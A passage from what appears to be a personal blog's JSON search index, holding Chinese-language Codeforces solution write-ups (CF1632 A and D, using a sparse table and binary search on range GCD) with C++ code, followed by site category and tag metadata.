freopen(&quot;out&quot;,&quot;w&quot;,stdout); int tt;cin&gt;&gt;tt; while(tt--)&#123; int n,k;cin&gt;&gt;n&gt;&gt;k; int cnt[35]=&#123;0&#125;; for(int i=1;i&lt;=n;i++)&#123; int t;cin&gt;&gt;t; for(int i=0;i&lt;=30;i++)&#123; if(1&amp;(t&gt;&gt;i))cnt[i]++; &#125; &#125; int ans=0; for(int i=30;i&gt;=0;i--)&#123; if(k&gt;=n-cnt[i])&#123; k-=(n-cnt[i]); ans+=1&lt;&lt;i; &#125; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0;&#125;","categories":[{"name":"acm","slug":"acm","permalink":"http://zzuzyj.github.io/categories/acm/"}],"tags":[{"name":"codeforces","slug":"codeforces","permalink":"http://zzuzyj.github.io/tags/codeforces/"}]},{"title":"CF1632","slug":"CF1632","date":"2022-05-03T09:23:29.807Z","updated":"2022-04-27T08:05:46.000Z","comments":true,"path":"2022/05/03/CF1632/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/CF1632/","excerpt":"","text":"CF1632题目链接 ：http://codeforces.com/contest/1632 A ABC题目要求满足一串01字符串排列组合后不能有大于1长度的回文串，多举几组例子，发现无论0和1 谁的数量超过2，结果就是 no，抽屉原理可知n&gt;=3,时，结果一定为no，代码如下 12345678910111213#include&lt;iostream&gt;using namespace std;int main()&#123; int tt;cin&gt;&gt;tt; while(tt--)&#123; int n;cin&gt;&gt;n; string s;cin&gt;&gt;s; if(s[1]==s[0]||n&gt;=3)cout&lt;&lt;&quot;NO&quot;&lt;&lt;endl; else cout&lt;&lt;&quot;YES&quot;&lt;&lt;endl; &#125; return 0;&#125; B. Roof ConstructionD. New Year Concert今天刚学了st表，这就用上了，这一题是二分+st表 当r的值确定时，gcd(a_l,a_{l+1},....,a_r)随着l递增，而r-l+1却是递减，则两条\\\\线必有1或0个交点， 也就是说，对于每一个r，只可能有不存在或者仅有一个l使得gcd(a_l,a_{l+1},....,\\\\a_r)=r-l+1这两种情况，用ans[N]记录答案，st表记录区间gcd，对一个每一个r，用二\\\\分搜索是是否有满足条件的l,如果没有继承上一个状态，如果有，ans[i]=ans[whereL-1]+1;\\\\代码如下123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;using namespace std;const int N=200010;int a[N],lg[N],f[N][20],ans[N];int gcd(int a,int b)&#123;return b==0?a:gcd(b,a%b);&#125;int query(int l,int r)&#123; int k=lg[r-l+1]; return gcd(f[l][k],f[r-(1&lt;&lt;k)+1][k]);&#125;int main()&#123; int n;cin&gt;&gt;n; for(int i=1;i&lt;=n;i++)&#123; cin&gt;&gt;a[i];f[i][0]=a[i]; &#125; for(int k=1;k&lt;=20;k++)&#123; for(int i=1;i+(1&lt;&lt;k)-1&lt;=n;i++)&#123; f[i][k]=gcd(f[i][k-1],f[i+(1&lt;&lt;k-1)][k-1]); &#125; &#125; lg[0]=-1; for(int i=1;i&lt;=n;i++) lg[i]=lg[i/2]+1; for(int i=1;i&lt;=n;i++)&#123; int l=1,r=i,whereL=0; while(l&lt;=r)&#123; int mid=l+r&gt;&gt;1; if(query(mid,i)==i-mid+1)&#123;whereL=mid;break;&#125; else if(query(mid,i)&lt;i-mid+1)l=mid+1; else r=mid-1; &#125; if(!whereL)ans[i]=ans[i-1]; else ans[i]=ans[whereL-1]+1; &#125; for(int i=1;i&lt;=n;i++)cout&lt;&lt;ans[i]&lt;&lt;&quot; &quot;; return 0;&#125;","categories":[{"name":"acm","slug":"acm","permalink":"http://zzuzyj.github.io/categories/acm/"}],"tags":[{"name":"codeforces","slug":"codeforces","permalink":"http://zzuzyj.github.io/tags/codeforces/"}]}],"categories":[{"name":"acm","slug":"acm","permalink":"http://zzuzyj.github.io/categories/acm/"},{"name":"algorithm","slug":"algorithm","permalink":"http://zzuzyj.github.io/categories/algorithm/"},{"name":"模板","slug":"algorithm/模板","permalink":"http://zzuzyj.github.io/categories/algorithm/%E6%A8%A1%E6%9D%BF/"},{"name":"Crypto","slug":"Crypto","permalink":"http://zzuzyj.github.io/categories/Crypto/"},{"name":"python","slug":"python","permalink":"http://zzuzyj.github.io/categories/python/"},{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/categories/web/"}],"tags":[{"name":"数学","slug":"数学","permalink":"http://zzuzyj.github.io/tags/%E6%95%B0%E5%AD%A6/"},{"name":"st表","slug":"st表","permalink":"http://zzuzyj.github.io/tags/st%E8%A1%A8/"},{"name":"倍增","slug":"倍增","permalink":"http://zzuzyj.github.io/tags/%E5%80%8D%E5%A2%9E/"},{"name":"RSA","slug":"RSA","permalink":"http://zzuzyj.github.io/tags/RSA/"},{"name":"numpy","slug":"numpy","permalink":"http://zzuzyj.github.io/tags/numpy/"},{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/tags/web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://zzuzyj.github.io/tags/ctfshow/"},{"name":"爆破","slug":"爆破","permalink":"http://zzuzyj.github.io/tags/%E7%88%86%E7%A0%B4/"},{"name":"文件包含","slug":"文件包含","permalink":"http://zzuzyj.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件上传","slug":"文件上传","permalink":"http://zzuzyj.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"命令执行","slug":"命令执行","permalink":"http://zzuzyj.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"sql注入","slug":"sql注入","permalink":"http://zzuzyj.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"php特性","slug":"php特性","permalink":"http://zzuzyj.github.io/tags/php%E7%89%B9%E6%80%A7/"},{"name":"java安全","slug":"java安全","permalink":"http://zzuzyj.github.io/tags/java%E5%AE%89%E5%85%A8/"},{"name":"codeforces","slug":"codeforces","permalink":"http://zzuzyj.github.io/tags/codeforces/"}]}